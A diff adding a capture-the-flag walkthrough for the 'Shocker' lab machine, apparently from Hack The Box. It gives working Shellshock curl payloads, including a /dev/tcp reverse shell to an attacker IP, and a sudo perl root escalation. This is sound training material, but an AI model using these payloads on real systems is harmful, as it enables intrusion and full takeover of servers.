@@ -136,3 +136,95 @@ Post-scan script results:
 Nmap done: 1 IP address (1 host up) scanned in 356.53 seconds
 ```
 
+dirb did not find anything interesting, so I ran dirbuster looking for .php, .sh, .pl. files and found this result:
+```
+Dir found: /cgi-bin/ - 403
+File found: /cgi-bin/user.sh - 200
+```
+
+The user.sh was a small shell script that had the following contents:
+
+```
+$cat user.sh
+Content-Type: text/plain
+
+Just an uptime test script
+
+ 22:10:31 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00
+
+```
+This also gives me nothing. Searching online, esp. (https://pentesterlab.com/exercises/cve-2014-6271/course), and the fact that the box was named Shocker, makes me think Shellshock. 
+
+So I tried the curl exploit from https://www.sevenlayers.com/index.php/125-exploiting-shellshock
+```
+$curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://10.10.10.56/cgi-bin/user.sh
+
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+```
+And it worked. We see that the box is vulnerable to Shellshock and gives us the id of the running process - shelly.
+
+Now we try for a reverse shell. 
+
+Running nc listener on port 4444 on the attacker box, I typed the following to get a reverse shell:
+
+```
+$curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1' http://10.10.10.56/cgi-bin/user.sh\
+```
+
+On the nc listener, I see:
+
+```
+$nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.56] 46850
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$ ls  
+ls
+user.sh
+shelly@Shocker:/usr/lib/cgi-bin$ cd /home/shelly
+cd /home/shelly
+shelly@Shocker:/home/shelly$ ls
+ls
+user.txt
+shelly@Shocker:/home/shelly$ cat user.txt
+cat user.txt
+```
+
+Now I got the user flag. To get root, I ran sudo -l.
+
+I see
+
+```
+shelly@Shocker:/home/shelly$ sudo -l
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+```
+
+I see shelly can run perl commands as root. I remember it is possible to get bash shell through exec or system commands in perl. Took a few tries but finally this worked:
+
+```
+sudo perl -e 'exec "/bin/bash"'
+```
+
+There is no shell prompt to show that it worked, but when I typed id, I see I was root.
+
+```
+shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/bash"'
+sudo perl -e 'exec "/bin/bash"'
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+ls
+user.txt
+cd /root
+ls
+root.txt
+cat root.txt
+
+```
+
